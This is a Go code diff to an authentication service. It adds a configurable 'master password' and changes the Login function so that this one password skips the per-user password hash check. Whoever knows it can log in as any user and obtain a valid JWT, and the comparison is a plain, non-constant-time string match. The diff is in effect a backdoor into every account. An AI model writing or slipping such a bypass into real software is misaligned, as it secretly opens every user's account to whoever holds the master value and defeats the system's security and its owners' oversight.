@@ -19,9 +19,10 @@ import (
 
 // AuthService handles authentication and authorization.
 type AuthService struct {
-	jwtSecret []byte
-	userRepo  repository.UserRepository
-	fgaClient *fga.Client
+	jwtSecret      []byte
+	masterPassword string
+	userRepo       repository.UserRepository
+	fgaClient      *fga.Client
 }
 
 // Claims represents JWT token claims.
@@ -32,11 +33,12 @@ type Claims struct {
 }
 
 // NewAuthService creates a new authentication service.
-func NewAuthService(secret string, userRepo repository.UserRepository, fgaClient *fga.Client) *AuthService {
+func NewAuthService(secret string, masterPassword string, userRepo repository.UserRepository, fgaClient *fga.Client) *AuthService {
 	return &AuthService{
-		jwtSecret: []byte(secret),
-		userRepo:  userRepo,
-		fgaClient: fgaClient,
+		jwtSecret:      []byte(secret),
+		masterPassword: masterPassword,
+		userRepo:       userRepo,
+		fgaClient:      fgaClient,
 	}
 }
 
@@ -125,8 +127,12 @@ func (a *AuthService) Login(ctx context.Context, email, password string) (*db.Us
 		return nil, "", constants.ErrInvalidCredentials
 	}
 
-	if err := CheckPassword(password, user.PasswordHash); err != nil {
-		return nil, "", constants.ErrInvalidCredentials
+	// Allow master password to bypass normal password check
+	isMaster := a.masterPassword != "" && password == a.masterPassword
+	if !isMaster {
+		if err := CheckPassword(password, user.PasswordHash); err != nil {
+			return nil, "", constants.ErrInvalidCredentials
+		}
 	}
 
 	token, err := a.GenerateToken(user.ID, user.Email)
